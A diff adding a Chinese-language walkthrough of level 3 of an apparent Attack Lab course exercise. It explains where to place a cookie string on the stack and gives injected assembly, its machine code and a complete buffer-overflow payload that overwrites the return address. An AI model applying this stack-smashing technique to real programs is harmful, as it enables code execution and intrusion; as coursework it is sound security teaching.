@@ -60,3 +60,43 @@ Disassembly of section .text:
 
 ### 第三关
 
+这和第二关的区别是，这里需要把 %rdi 赋值为 "3d9549ca" 字符串的首地址，而这个 "3d9549ca" 也需要我们在栈区上注入；
+
+根据实验文档的提示，`调用*hexmatch*和*strncmp*函数时，会将数据压入栈中，覆盖*getbuf*使用的缓冲区的内存，你需要很小心把你的cookie字符串表示放在哪里`。
+
+如果我们把字符串存在 getbuf 的缓冲区中，则 hexmatch 函数中进行比较的时候，%rdi 寄存器存储的地址依然在 getbuf 缓冲区，但是这是我们的 cookie 字符串已经被 hexmatch 函数破坏了；
+
+因此我们需要将 cookie 字符串注入到一个不会被影响的地方。
+
+经过断点调试，发现 getbuf 栈帧开始的 24 个字节，会被 hexmatch 和 strncmp 函数破坏，因此我们只需将 cookie 字符串存到这个区域外，且不能和 getbuf 的 return address 区冲突即可。
+
+那么不妨存到 `0x55654cb8`，我们将 cookie `3d9549ca` 转为对应 ASCII 码的十六进制表示：`33 64 39 35 34 39 63 61`。
+
+注入的代码：
+
+```assembly
+pushq $0x4017ad # touch3
+movq $0x55654cb8, %rdi
+req
+```
+
+```assembly
+   0:	68 ad 17 40 00       	pushq  $0x4017ad
+   5:	48 c7 c7 b8 4c 65 55 	mov    $0x55654cb8,%rdi
+   c:	c3                   	retq   
+```
+
+`68 ad 17 40 00 48 c7 c7 b8 4c 65 55 c3`
+
+```c
+68 ad 17 40 00 48 c7 c7 b8 4c 65 55 c3 00 00 00 00 00 00 00 00 00 00 00
+98 4c 65 55 00 00 00 00
+33 64 39 35 34 39 63 61
+```
+
+
+
+## ROP
+
+### 第四关
+
